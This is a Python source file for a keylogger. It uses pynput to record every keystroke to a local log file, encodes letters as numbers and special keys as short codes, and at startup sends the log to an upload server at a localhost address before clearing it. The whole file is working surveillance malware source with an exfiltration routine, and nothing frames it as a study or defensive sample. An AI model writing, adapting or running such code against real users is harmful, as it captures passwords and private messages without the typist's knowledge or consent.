import os
import requests
from pynput import keyboard

log_file = "log.txt"
held_keys = set()  # Track currently held keys

SERVER_URL = "http://127.0.0.1:5000/upload"

# Clear the log file at the start
with open(log_file, "w") as f:
    f.write("")

def is_server_online():
    try:
        response = requests.get(SERVER_URL.replace("/upload", "/"))
        return response.status_code == 200
    except:
        return False

def upload_log():
    if not os.path.exists(log_file):
        return
    with open(log_file, "r") as f:
        data = f.read()
    if not data.strip():
        return  # Nothing to upload
    try:
        r = requests.post(SERVER_URL, data=data.encode("utf-8"))
        if r.status_code == 200:
            print("Logs uploaded successfully. Clearing local log.")
            open(log_file, "w").close()  # Clear local logs after upload
        else:
            print(f"Failed to upload logs. Server returned status code {r.status_code}")
    except Exception as e:
        print("Failed to upload logs:", e)

# Try to upload logs on startup
if is_server_online():
    upload_log()
else:
    print("Server not reachable, proceeding normally.")

def transform_key(c):
    if c.isalpha():
        num = str(ord(c.lower()) - ord('a') + 1)
        return f"UP {num}" if c.isupper() else num
    elif c.isdigit():
        return f"NUM {c}"
    return c

def transform_special(key):
    special_keys = {
        keyboard.Key.shift: "",
        keyboard.Key.shift_r: "",
        keyboard.Key.ctrl_l: "CL",
        keyboard.Key.ctrl_r: "CR",
        keyboard.Key.caps_lock: "CL",
        keyboard.Key.enter: "ETR",
        keyboard.Key.space: "SP",
        keyboard.Key.backspace: "BS",
        keyboard.Key.tab: "TB",
        keyboard.Key.left: "LFT",
        keyboard.Key.right: "RGT",
        keyboard.Key.up: "UP",
        keyboard.Key.down: "DWN",
        keyboard.Key.cmd: "WD",
        keyboard.Key.esc: "EC",
        keyboard.Key.alt_l: "AT"
    }
    return special_keys.get(key, str(key))

def on_press(key):
    if key in held_keys:
        return  # Prevent repeat logging

    held_keys.add(key)

    # Exit on Right ALT (AltGr)
    if key == keyboard.Key.alt_gr:
        print("\nRight ALT (AltGr) detected. Exiting and saving log.")
        return False

    # Clear log file on Right Ctrl
    if key == keyboard.Key.ctrl_r:
        with open(log_file, "w") as f:
            f.write("")
        print("Right Ctrl pressed — log file cleared.")
        return

    try:
        key_str = key.char
        transformed = transform_key(key_str)
    except AttributeError:
        transformed = transform_special(key)

    with open(log_file, "a") as f:
        f.write(f"{transformed} ")

    print(f"Key pressed: {key} -> Logged as: {transformed}")

def on_release(key):
    held_keys.discard(key)  # Mark key as released

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
